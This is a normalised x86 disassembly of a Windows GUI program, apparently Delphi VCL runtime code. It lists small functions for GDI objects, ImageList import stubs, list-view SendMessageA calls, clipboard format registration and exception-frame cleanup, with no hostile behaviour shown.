sub_4252e4
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_42537e
jmp sub_403a0c
sub_42555a
jmp sub_403a0c
sub_425614
jmp sub_403a0c
sub_42561b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42563b
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425634
jmp sub_403a0c
sub_42563b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4257c9
jmp sub_403a0c
sub_425994
jmp sub_403a0c
sub_42599b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4259be
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026ec
retn
sub_4259b7
jmp sub_403a0c
sub_4259be
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4259de
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
sub_4259d7
jmp sub_403a0c
sub_4259de
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_425b30
push 0x0
call sub_425acc
retn
sub_425bd5
jmp sub_403a0c
sub_425bdc
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425be8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_425b38
pop ebx
pop ebp
retn 0x4
sub_425bfc
retn
sub_425c00
test eax eax
jne r-xdata
retn
call sub_425bfc
sub_425dd3
jmp sub_403a0c
sub_425dfa
jmp sub_403a0c
sub_425e01
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425e40
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_42600d
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_426016
jmp sub_403a0c
j_sub_42600d
jmp sub_42600d
sub_42601d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_426033
jmp sub_403a0c
sub_426044
xor eax eax
retn
sub_426048
mov al [ eax + 0x21 ]
retn
sub_426094
jmp sub_403a0c
sub_42609b
pop esi
pop ecx
pop ebp
retn
sub_4260c8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_42611f
jmp sub_403a0c
sub_426126
pop esi
pop ecx
pop ebp
retn
sub_42612c
retn
sub_426130
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426140
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_42625e
jmp sub_403a0c
sub_426286
jmp sub_403a0c
sub_42628d
mov esp ebp
pop ebp
retn
sub_426304
jmp sub_403a0c
sub_42640c
jmp sub_403a0c
sub_4264f7
jmp sub_403a0c
sub_426504
inc [ eax + 0x4 ]
retn
sub_42667f
jmp sub_403a0c
sub_426a30
jmp sub_403a0c
sub_426c7a
jmp sub_403a0c
sub_426ca4
jmp sub_403a0c
sub_426cab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ccd
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_426cc6
jmp sub_403a0c
sub_426cd7
jmp sub_403758
sub_426d26
jmp sub_403a0c
sub_426f53
jmp sub_403a0c
sub_426f9b
jmp sub_403a0c
sub_427108
jmp sub_403a0c
sub_4271cf
jmp sub_403758
sub_427224
mov [ eax + 0x31 ] 0x0
call sub_425e40
retn
sub_427475
jmp sub_403a0c
sub_4274e0
jmp sub_403a0c
sub_4274e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427558
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_42760c
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_42761c
push ebx
mov ebx eax
mov eax ebx
call sub_4277d4
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_427630
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_42764c
push ebx
mov ebx eax
mov eax ebx
call sub_427834
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4276a8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4277b7
jmp sub_403a0c
sub_427a1b
jmp sub_403758
sub_427a7b
jmp sub_403a0c
sub_427a82
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_427e63
jmp sub_403a0c
sub_427e8f
jmp sub_403a0c
sub_427ef6
jmp sub_403758
sub_427f27
jmp sub_403a0c
sub_427fac
jmp sub_403758
sub_427fb1
mov eax [ ebp - 0x38 ]
call sub_403290
call sub_403a6c
call sub_403ac0
sub_427fc3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427fe0
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
sub_427fd9
jmp sub_403a0c
sub_42812f
jmp sub_403758
sub_4283fb
jmp sub_403758
sub_42848c
mov cl 0x1
call sub_428494
retn
sub_428749
add [ eax ] al
add [ ebx ] dh
leave
call sub_428494
retn
sub_4287ce
jmp sub_403758
sub_4287d3
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a6c
call sub_403ac0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428824
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42895d
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42898c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_4289a0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_428ab9
jmp sub_403758
sub_428b6e
jmp sub_403758
sub_428bd8
jmp sub_403758
sub_428c0c
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_428b98
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_428c24
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424b5c
retn
mov [ eax + 0x30 ] edx
retn
sub_428c3c
retn
sub_428c40
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424b5c
retn
mov [ eax + 0x2c ] edx
retn
sub_428c80
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424b5c
pop ebp
retn 0x4
sub_428c94
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424b5c
pop ebp
retn 0x4
sub_428e54
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_428e60
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_428f0d
jmp sub_403a0c
sub_428f14
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_428fff
jmp sub_403758
sub_42906b
jmp sub_403a0c
sub_429199
jmp sub_403a0c
sub_4291a0
pop ebp
retn
sub_4292a0
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_4292d5
jmp sub_403a0c
sub_4292dc
pop ebp
retn
sub_4292e0
sub [ rw-data ] 0x1
retn
sub_429528
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_418310
retn
sub_42955c
mov eax [ eax + 0x4 ]
call sub_4181b4
retn
sub_42958d
jmp sub_403a0c
sub_429594
pop ebp
retn
sub_429598
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ InitCommonControls@IAT ]
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ __import_lookup_table_12(comctl32:ImageList_DragShowNolock) ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ __import_lookup_table_12(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_429724
push ecx
push edx
push 0x1212
push eax
call SendMessageA
retn
sub_429734
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1002
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42974c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1004
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429764
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42977c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1009
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4297b0
push edx
push 0x0
push 0x100f
push eax
call SendMessageA
retn
sub_4297dc
push 0x0
push edx
push 0x1014
push eax
call SendMessageA
retn
sub_429811
jmp sub_403a0c
sub_429818
pop ebp
retn
sub_42981c
sub [ rw-data ] 0x1
retn
sub_4298e3
jmp sub_403a0c
sub_4298ea
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429f00
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42990c
mov [ rw-data ] sub_429a24
mov [ rw-data ] sub_429994
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_429c28
mov [ rw-data ] sub_429cfc
mov [ rw-data ] sub_429dd0
retn
sub_429f91
jmp sub_403a0c
sub_429f98
pop ebp
retn
sub_429f9c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_429f00
sub_429fd1
jmp sub_403a0c
sub_429fd8
pop ebp
retn
sub_429fdc
sub [ rw-data ] 0x1
retn
sub_42a26b
add eax 0xffffffd4
jmp sub_42ad98
sub_42a273
add eax 0xffffffd4
jmp sub_42adf4
sub_42a285
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405948
sub_42a28f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40595c
sub_42a41e
jmp sub_403a0c
sub_42a425
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a635
jmp sub_403a0c
sub_42a63c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a7f1
jmp sub_403a0c
sub_42a856
jmp sub_403a0c
sub_42a85d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a949
jmp sub_403a0c
sub_42a950
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42ab60
lea eax [ ebp - 0x30 ]
call sub_404008
lea eax [ ebp - 0x20 ]
call sub_404008
retn
sub_42ab71
jmp sub_403a0c
j_sub_42ab60
jmp sub_42ab60
sub_42ab78
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ac73
jmp sub_403a0c
sub_42ac7a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ad77
jmp sub_403a0c
sub_42ad7e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42adde
lea eax [ ebp - 0x4 ]
call sub_405874
retn
sub_42ade7
jmp sub_403a0c
j_sub_42adde
jmp sub_42adde
sub_42adee
pop ebx
pop ecx
pop ebp
retn
sub_42ae89
jmp sub_403a0c
sub_42ae90
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42ae9c
mov eax [ eax + 0x20 ]
retn
sub_42afcb
jmp sub_403a0c
sub_42afd2
pop ebp
retn
sub_42afd4
sub [ rw-data ] 0x1
retn
sub_42b001
jmp sub_403a0c
sub_42b008
pop ebp
retn
sub_42b00c
sub [ rw-data ] 0x1
retn
sub_42b045
jmp sub_403a0c
sub_42b04c
pop ebp
retn
sub_42b050
sub [ rw-data ] 0x1
retn
sub_42b35d
jmp sub_403a0c
sub_42b364
pop ebp
retn
sub_42b368
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42b0b4
sub_42b448
retn
sub_42b4bc
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42b4c8
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42b4d4
mov edx [ eax ]
call [ edx ]
retn
sub_42b4dc
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42b509
jmp sub_403a0c
sub_42b510
pop ebp
retn
sub_42b514
sub [ rw-data ] 0x1
retn
sub_42b6d3
jmp sub_403a0c
sub_42b6da
pop ebp
retn
sub_42ba8f
jmp sub_403a0c
sub_42ba96
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42beb0
jmp sub_403a0c
sub_42beb7
pop ebp
retn
sub_42bebc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b44c
mov [ rw-data ] eax
sub_42befd
jmp sub_403a0c
sub_42bf04
pop ebp
retn
sub_42bf08
sub [ rw-data ] 0x1
retn
sub_42c0d2
and al 0xc3
inc edx
add [ eax - 0x5bffbd3d ] cl
retn
sub_42c190
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44c87c
sub_42c1a4
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_44c87c
sub_42c37a
jmp sub_403a0c
sub_42c381
pop ecx
pop ecx
pop ebp
retn
sub_42c388
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c87c
mov edx esi
mov eax ebx
call sub_44e8b4
pop esi
pop ebx
retn
sub_42c3a4
push ebx
mov ebx eax
mov eax ebx
call sub_44e8f4
mov al [ r-xdata ]
cmp al [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44c87c
sub_42c3ed
jmp sub_403a0c
sub_42c3f4
pop ebp
retn
sub_42c3f8
sub [ rw-data ] 0x1
retn
sub_42c425
jmp sub_403a0c
sub_42c42c
pop ebp
retn
sub_42c430
sub [ rw-data ] 0x1
retn
sub_42c45d
jmp sub_403a0c
sub_42c464
pop ebp
retn
sub_42c468
sub [ rw-data ] 0x1
retn
sub_42c495
jmp sub_403a0c
sub_42c49c
pop ebp
retn
sub_42c4a0
sub [ rw-data ] 0x1
retn
sub_42c4cd
jmp sub_403a0c
sub_42c4d4
pop ebp
retn
sub_42c4d8
sub [ rw-data ] 0x1
retn
sub_42c505
jmp sub_403a0c
sub_42c50c
pop ebp
retn
sub_42c510
sub [ rw-data ] 0x1
retn
ChooseColorA
jmp [ ChooseColorA@IAT ]
sub_42c545
jmp sub_403a0c
sub_42c54c
pop ebp
retn
sub_42c550
sub [ rw-data ] 0x1
retn
sub_42c57d
jmp sub_403a0c
sub_42c584
pop ebp
retn
sub_42c588
sub [ rw-data ] 0x1
retn
sub_42cafa
jmp sub_403758
sub_42caff
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468614
call sub_403ac0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42cb1c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42cb24
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_40348c
pop esi
retn
sub_42cb3c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_40348c
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42cb54
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42cbfd
jmp sub_403a0c
sub_42cc2b
jmp sub_403a0c
sub_42cc32
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cc3c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42cc50
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42cd75
jmp sub_403a0c
sub_42cd7c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ce42
jmp sub_403a0c
sub_42ce49
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cf24
push esi
mov esi eax
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42d17e
jmp sub_403a0c
sub_42d185
pop ebp
retn
sub_42f130
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42f138
mov eax [ eax + 0x16c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_42f144
mov eax [ eax + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_42f150
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f302
jmp sub_403758
sub_42f3bb
jmp sub_403a0c
sub_42f3c2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f3c8
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42f33c
sub_42f3d8
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42f33c
sub_42f3e8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42f33c
pop ebp
retn 0x8
sub_42f400
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42f69d
jmp sub_403758
sub_42f810
retn
sub_42f99d
jmp sub_403a0c
sub_42fa20
push ebx
mov ebx eax
mov eax ebx
call sub_44abb0
mov eax ebx
call sub_42f814
pop ebx
retn
sub_42fa34
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_44b2d0
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_42fb5c
pop ebx
retn
sub_42fb4c
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42fc25
jmp sub_403a0c
sub_42fc2c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42fc74
push ebx
mov ebx eax
mov eax ebx
call sub_44e838
mov eax ebx
call sub_42f814
pop ebx
retn
sub_42fc88
push ebx
mov ebx eax
mov eax ebx
call sub_43d768
mov eax ebx
call sub_42f814
pop ebx
retn
sub_42fc9c
mov al 0x1
retn
sub_42fca0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42fca8
push ebx
mov ebx eax
mov eax ebx
call sub_43ebf4
mov [ ebx + 0x29a ] 0x1
pop ebx
retn
sub_42ff45
jmp sub_403a0c
sub_42ff4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ffd9
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0xfd5173d ]
add [ eax ] al
cmp [ ebx + 0x299 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4303ec
sub_43019a
jmp sub_403a0c
sub_4301a1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4301ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
sub_430204
push ecx
mov [ esp ] cl
mov [ eax + 0x29a ] 0x0
mov cl [ esp ]
call sub_44e108
pop edx
retn
sub_430274
push ebx
mov ebx eax
mov eax ebx
call sub_43eb98
mov edx [ ebx + 0x2a4 ]
mov eax ebx
call sub_43061c
pop ebx
retn
sub_43034f
jmp sub_403a0c
sub_430356
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430373
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_43036c
jmp sub_403a0c
sub_430373
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43057b
jmp sub_403a0c
sub_4305a2
jmp sub_403a0c
sub_4305a9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4305f4
cmp edx [ eax + 0x29c ]
je r-xdata
retn
mov [ eax + 0x29c ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_430608
cmp edx [ eax + 0x2a0 ]
je r-xdata
retn
mov [ eax + 0x2a0 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4308ef
retn
sub_4308f0
jmp sub_403a0c
j_sub_4308ef
jmp sub_4308ef
sub_4308f7
pop ebp
retn
sub_4308fc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d90
mov eax [ r-xdata ]
call sub_417944
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
sub_430989
jmp sub_403a0c
sub_430990
pop ebp
retn
sub_430994
sub [ rw-data ] 0x1
retn
sub_4309cd
jmp sub_403a0c
sub_4309d4
pop ebp
retn
sub_4309d8
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_430a54
retn
sub_430a55
jmp sub_403a0c
j_sub_430a54
jmp sub_430a54
sub_430a5c
pop ebp
retn
sub_430a60
sub [ rw-data ] 0x1
retn
sub_430a68
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403290
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_430b2c
jmp sub_403a0c
sub_430b33
pop ebp
retn
sub_430b38
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_430a84
call sub_403ddc
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402ca4
sub_430b85
jmp sub_403a0c
sub_430b8c
pop ebp
retn
sub_430b90
sub [ rw-data ] 0x1
retn
sub_430bec
jmp sub_403a0c
sub_430bf3
pop ebp
retn
sub_430bf8
sub [ rw-data ] 0x1
retn
sub_430c54
jmp sub_403a0c
sub_430c5b
pop ebp
retn
sub_430c60
sub [ rw-data ] 0x1
retn
sub_430cc1
jmp sub_403a0c
sub_430cc8
pop ebp
retn
sub_430ccc
sub [ rw-data ] 0x1
retn
sub_430d18
jmp sub_403a0c
sub_430d1f
pop ebp
retn
sub_430d24
sub [ rw-data ] 0x1
retn
sub_430d51
jmp sub_403a0c
sub_430d58
pop ebp
retn
sub_430d5c
sub [ rw-data ] 0x1
retn
sub_432554
inc esp
add al bh
hlt
sub_4342fc
cmp dl [ eax + 0x24 ]
je r-xdata
retn
mov [ eax + 0x24 ] dl
mov [ eax + 0x25 ] 0x0
xor edx edx
call sub_418ccc
sub_434310
mov al [ eax + 0x25 ]
xor al 0x1
retn
sub_434318
cmp dl [ eax + 0x25 ]
je r-xdata
retn
mov [ eax + 0x25 ] dl
call sub_434328
sub_434360
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_434378
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4343b4
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
xor edx edx
call sub_418ccc
sub_4343e4
mov ecx [ eax + 0x14 ]
cmp edx ecx
jge r-xdata
cmp edx 0x2710
jle r-xdata
mov edx ecx
mov [ eax + 0x18 ] edx
mov edx [ eax + 0x10 ]
call sub_43445c
retn
mov edx 0x2710
sub_434408
test edx edx
jge r-xdata
mov ecx [ eax + 0x18 ]
cmp edx ecx
jle r-xdata
xor edx edx
mov [ eax + 0x14 ] edx
mov edx [ eax + 0x10 ]
call sub_43445c
retn
mov edx ecx
sub_434424
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
xor edx edx
call sub_418ccc
sub_4344a4
cmp edx [ eax + 0x20 ]
je r-xdata
retn
mov [ eax + 0x20 ] edx
xor edx edx
call sub_418ccc
sub_4344f8
or ecx 0xffffffff
xor edx edx
call sub_434548
retn
sub_434518
mov eax [ eax + 0x18 ]
retn
sub_4347c0
jmp sub_403a0c
sub_4348e2
jmp sub_403a0c
sub_4348e9
mov eax [ ebp - 0x4 ]
call sub_44c678
pop ecx
pop ecx
pop ebp
retn
sub_434a9e
jmp sub_403a0c
sub_434b3c
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_434b5c
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_434ba8
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_44c87c
sub_434bbc
cmp dl [ eax + 0x221 ]
je r-xdata
retn
mov [ eax + 0x221 ] dl
call sub_44c87c
sub_434bd0
cmp dl [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] dl
call sub_44c87c
sub_434be4
cmp dl [ eax + 0x222 ]
je r-xdata
retn
mov [ eax + 0x222 ] dl
call sub_44c87c
sub_434bf8
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_434ea5
jmp sub_403a0c
sub_434eac
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_435052
jmp sub_403a0c
sub_43543e
jmp sub_403a0c
sub_43545b
jmp sub_403a0c
sub_43546c
push ebx
mov ebx eax
mov eax ebx
call sub_44d7b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4356bc
jmp sub_403a0c
sub_4356c3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4356e6
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4051c8
retn
sub_4356df
jmp sub_403a0c
sub_4356e6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435748
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_4357a0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4344b4
retn
sub_435958
push ebx
mov ebx eax
mov eax ebx
call sub_4359e4
mov [ ebx + 0x214 ] eax
mov eax ebx
call sub_44c678
pop ebx
retn
sub_435b67
jmp sub_403a0c
sub_435b6e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435b78
